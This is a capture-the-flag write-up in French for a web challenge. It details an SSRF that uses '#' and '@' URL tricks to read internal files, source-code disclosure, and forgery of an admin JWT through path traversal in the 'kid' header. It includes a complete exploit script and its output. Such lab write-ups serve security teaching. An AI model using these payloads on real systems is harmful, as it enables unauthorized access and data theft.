> Name: Intleaks
> 
> Category:  Web
> 
> Difficulty: Medium
> 
> Description: 
> *A new website has emerged and it appears to leak classified data. Our sources have told us they are going to release a sensitive document very soon...*
> 
> *Can you get your hands on the next leak before it becomes public ?*

![challs lab algosecu re_40005_](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/2e3cd01c-bf8f-48a1-9be3-342115ecf575)

L'objectif du challenge est de récupérer la fameuse fuite qui devrait sortir prochainement. Or, pour déjà lire les fuites précédentes, il faut accepter le "user agreement" qui génère un jwt stocké dans le cookie :

```bash

$> curl -D- 'http://<chall>/api/auth'

(...)
Set-Cookie: jwt=eyJhbGciOiJIUzUxMiIsImtpZCI6ImQxZWZkZDk5LTZhZTQtNDc5MS05ODY1LWZiMjRiYjI0OTA2MC5rZXkiLCJ0eXAiOiJKV1QifQ.eyJhY2wiOiJhbm9uIn0.QNt8yKgWZHZ5WRLvSHpb82xIzlUjHAiJQX2Kc2Xv7G7hRNQV8-61Iqyfa1xejkpN2-vs_rFg0aZsrdZxK2rQDA; Path=/
```

Le JWT décodé donne :

```
# HEADER
{
  "alg": "HS512",
  "kid": "d1efdd99-6ae4-4791-9865-fb24bb249060.key",
  "typ": "JWT"
}
# PAYLOAD
{
  "acl": "anon"
}
```

On remarque deux choses intéressantes :
1. `kid` : c'est la clé utilisé pour générer le JWT. Elle est différente pour chaque visiteur du site
2. `acl`: cette clé représente ses droits courants sur le site, en l'occurrence `anon` = anonyme

Quand on accède à une fuite disponible, le serveur nous retourne un pdf dont l'URL est la forme :
```
http://<chall>/api/document?location=/scp_173.disclosed&t=1690352618981
```

On fuzz sur le paramètre `location` :

```
/api/document?location=/
|=> {"error":"Only .disclosed extension allowed."}
```

On essaie d'ajouter le `.disclosed`  à l'url `/api/document?location=/.disclosed` et on a un pdf généré d'une page forbidden d'Apache

```
Forbidden 

You don't have permission to access this resource. 
_______________________________________________________
Apache/2.4.55 (Ubuntu) Server at files.internal Port 80
```

ça ressemble à un début de SSRF mais le fait d'ajouter `.disclosed` ne plait pas au serveur Apache (surement une règle sur les fichiers commençant par un point). On peut penser que la requête qui est transmise au serveur ressemble probablement à :

```
http://files.internal/.disclosed
```

On teste en ajoutant un `#` avant le `.disclosed` pour avoir `/#.disclosed` et ainsi arriver sur la racine du serveur web (bien penser à encoder tout ça)

```
http://<chall>/api/document?location=/%23.disclosed
```

![Pasted image 20230726084352](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/4207c9a9-53e9-4763-8254-8db3ce807e31)

On arrive bien sur la racine du serveur web et par chance y a le directory listing. Le premier dossier `api_0aca881eb4_prod_v42_src/` contient d'ailleurs le code source de l'appli.

```
api_0aca881eb4_prod_v42_src/
|__ app.py
|__ authz/
	|__ __init__.py
	|__ jwt.py
|__ jwt_keys/
|__ pdf/
	|__ __init__.py
	|__ html2pdf.py
```

On commence par récupérer le code source de app.py

```
/api/document?location=/api_0aca881eb4_prod_v42_src/app.py%23.disclosed
```

![Pasted image 20230726084921](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/548b952d-ee6a-4ca0-94c6-3e3c4af8a259)

Le problème est que dans le pdf, le code n'est pas indenté... Soit on le fait à la mano en guessant un peu, ou on remarque la présence du paramètre `raw` qui retourne le texte brut sans générer de PDF !

```
if (request.args.get("raw") is not None): return content.text
```

```
http://<challs>/api/document?location=/api_0aca881eb4_prod_v42_src/app.py%23.disclosed&raw=true
```

> app.py

```python

# -*- coding: utf-8 -*- 

import os, requests
from flask import Flask, jsonify, request, make_response, send_file, abort

from authz import jwt
from pdf import html2pdf

app = Flask(__name__)
app.config['APPLICATION_ROOT'] = '/api'

@app.errorhandler(404)
def page_not_found(e):
    return jsonify({"error":"404 - Not found."}), 404

@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({"error":str(e)}), 500

@app.route('/auth')
def auth():
	role = "anon"
	if (request.remote_addr == os.environ["ADMIN_IP"]):
		role = "admin"
	
	jwt_enc = jwt.generate(request.remote_addr, {"acl":role})

	resp = make_response(jsonify({"jwt":jwt_enc}))
	resp.set_cookie('jwt', jwt_enc)

	return resp

@app.route("/me")
def me():
    if (request.cookies.get("jwt") is None):
	    raise NameError('Missing jwt cookie.')

    return jsonify(jwt.check(request.cookies.get("jwt")))

@app.route("/leaks")
def leaks():
    if (request.cookies.get("jwt") is None):
	    raise NameError('Missing jwt cookie.')

    jwt_dec = jwt.check(request.cookies.get("jwt"))
    if ("acl" not in jwt_dec or jwt_dec["acl"] != "admin"):
    	raise NameError('For admin only.')

    leak_domain = os.environ['LEAK_DOMAIN']
    leak_id = os.environ['LEAK_ID']
    leak_files = requests.get(f"http://{leak_domain}/{leak_id}").json()
    return jsonify({
    	leak_domain:leak_files
    })

@app.route('/document')
def document():

    if (request.cookies.get("jwt") is None):
        raise NameError('Missing jwt cookie.')

    jwt.check(request.cookies.get("jwt"))

    location = request.args.get("location")
    if (location is None):
        raise NameError("Missing location parameter.")

    if (not location.endswith(".disclosed")):
    	raise NameError("Only .disclosed extension allowed.")

    content = requests.get("http://files.internal" + location)
    if (content.status_code == 404):
        abort(404)

    if (request.args.get("raw") is not None):
        return content.text

    return send_file(
        html2pdf.generate_pdf(content, jwt.get_kid(request.cookies.get("jwt"))),
        mimetype='application/pdf'
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0")
```

Ce qui nous intéresse dans ce code source :
- dans `/auth`, on génère un jwt avec le role admin si notre ip de connexion est celle d'un admin (ça semble difficile de spoofer l'ip)
- pour accéder à `/leaks`, il faut avoir un jwt avec le role admin

On récupère le code source qui génère le jwt :

```bash
http://<challs>/api/document?location=/api_0aca881eb4_prod_v42_src/authz/jwt.py%23.disclosed&raw=true
```

> authz/jwt.py

```python

import jwt
import uuid
import secrets
import os

"""
	Return a JWT generated with a unique key for each user.
	Each key is stored in its own file on the jwt_keys folder.
"""
def generate(ip, data):

	key_name = str(uuid.uuid4()) + ".key"
	key_path = f"jwt_keys/{key_name}"

	user_secret = f"{ip}|{secrets.token_urlsafe(128)}"
	open(key_path, 'w').write(user_secret)

	return jwt.encode(data, user_secret, algorithm="HS512", headers={"kid": key_name})

"""
	Check if JWT is valid, signed and returns decoded jwt.
"""
def check(encoded_jwt):
	jwt_header = jwt.get_unverified_header(encoded_jwt)

	if ("kid" not in jwt_header):
		raise NameError('Missing kid in JWT header.')

	key_path = f"jwt_keys/{jwt_header['kid']}"

	if (not os.path.exists(key_path)):
		raise NameError('Key file not found.')

	if (os.path.getsize(key_path) == 0):
		raise NameError('Key file is empty.')

	with open(key_path, 'r') as file:
		user_secret = file.read()

	return jwt.decode(encoded_jwt, user_secret, algorithms="HS512")


def get_kid(encoded_jwt):
	return jwt.get_unverified_header(encoded_jwt)["kid"]
```

Les JWT sont générés de la façon suivante :
1. une clé aléatoire est stocké dans le fichier `jwt_keys/<uuid>.key` pour chaque utilisateur
2. `<uuid>.key` est mis dans le paramètre `kid` du header
3. le jwt est signé avec la clé contenu dans ce fichier

Techniquement, on peut donc signer nous même notre propre jwt à condition d'avoir un fichier en commun avec le serveur. Pour ça plusieurs choix :
- soit on signe un jwt avec un des fichiers sources qu'on a récupéré par exemple `../app.py` ou `../authz/jwt.py`
- soit on trouve un fichier commun qui existe sur tous les ubuntu comme le fichier `/etc/ld.so.conf`

On créer notre JWT avec le role admin et les bons paramètres :

```python
import jwt

key_path = f"../../../../../../etc/ld.so.conf"
data = {"acl": "admin"}

with open("/etc/ld.so.conf", 'r') as file:
    user_secret = file.read()

jwt_encoded = jwt.encode(data, user_secret, algorithm="HS512", headers={"kid": key_path})
print(jwt_encoded)
```

```bash
$> python3 jwt_admin.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9sZC5zby5jb25mIn0.eyJhY2wiOiJhZG1pbiJ9.ivCBMqv01Z0OB66JTdD_73whJDcxpUMsSlsmLd5pLaejfVt0BOAnuSHZDWOleFmT_uyjM2Gp7a8Ds4qv64cL4Q
```

En met ce jwt dans les cookie puis en allant sur `/api/me`, on voit bien désormais qu'on est admin : `{"acl":"admin"}`. On peut désormais aller voir les leaks sur `/api/leaks` :

```
{
  "whistleblower.internal":
    ["/flag_5d61b995c212f1ccb2ea.restricted"]
}
```

Notre fichier flag est sur le domaine interne whistleblower.internal. On va réutiliser notre SSRF pour y aller et le récupérer :

```
http://challs.lab.algosecu.re:40005/api/document?location=a@whistleblower.internal/flag_5d61b995c212f1ccb2ea.restricted%23.disclosed&raw=true
```

Note : pour changer de domaine, on va utiliser `@` pour faire `login@domain`

```
ALG{Cu5t0m_JwT_AnD_D0ubl3_S5RF_FTW}
```

Et le script d'exploitation de bout en bout :

```python
import jwt, json, sys, requests

if len(sys.argv) != 3:
    sys.exit(f"Usage : {sys.argv[0]} http://challenge_url key_file")

base_url = sys.argv[1]

key_path = f"../../../../../../{sys.argv[2]}"
data = {"acl": "admin"}

with open(sys.argv[2], 'r') as file:
    user_secret = file.read()

jwt_encoded = jwt.encode(data, user_secret, algorithm="HS512", headers={"kid": key_path})

r = requests.get(
    f"{sys.argv[1]}/api/me",
    cookies={"jwt": jwt_encoded}
)

if r.status_code != 200:
    print("Exploit failed =(")
    sys.exit(1)

print(f"[!] Common key : {sys.argv[2]}")
print(f" |___ jwt={jwt_encoded}")

print("")
print(f"[%] Getting leaks : {base_url}/api/leaks")
r = requests.get(
    f"{base_url}/api/leaks", 
    cookies={"jwt": jwt_encoded}
)
print(f" |___ response => {r.text}")

j = json.loads(r.text)

domain = next(iter(j))
flag = j[domain][0]

r = requests.get(
    f"{base_url}/api/document", 
    params={"location": f"@{domain}/{flag}#.disclosed", "raw":"true"}, 
    cookies={"jwt": jwt_encoded}
)

print(f"[%] Getting flag : {r.url}")
print(f" |___ Flag => {r.text}")

```


```
$> python3 flag.py http://10.0.21.22:40005 /etc/ld.so.conf

[!] Common key : /etc/ld.so.conf
 |___ jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy9ldGMvbGQuc28uY29uZiJ9.eyJhY2wiOiJhZG1pbiJ9.1XF9wpaqyYGu5YsihpAXOrsPxGa9ic9K8CVrpuA4qPULda0Efq3y50LZJ7cRnEdUPs25KrTwOCPHAcLWt5MLYA

[%] Getting leaks : http://10.0.21.22:40005/api/leaks
 |___ response => {"whistleblower.internal":["/flag_5d61b995c212f1ccb2ea.restricted"]}

[%] Getting flag : http://10.0.21.22:40005/api/document?location=%40whistleblower.internal%2F%2Fflag_5d61b995c212f1ccb2ea.restricted%23.disclosed&raw=true
 |___ Flag => ALG{Cu5t0m_JwT_AnD_D0ubl3_S5RF_FTW}

```
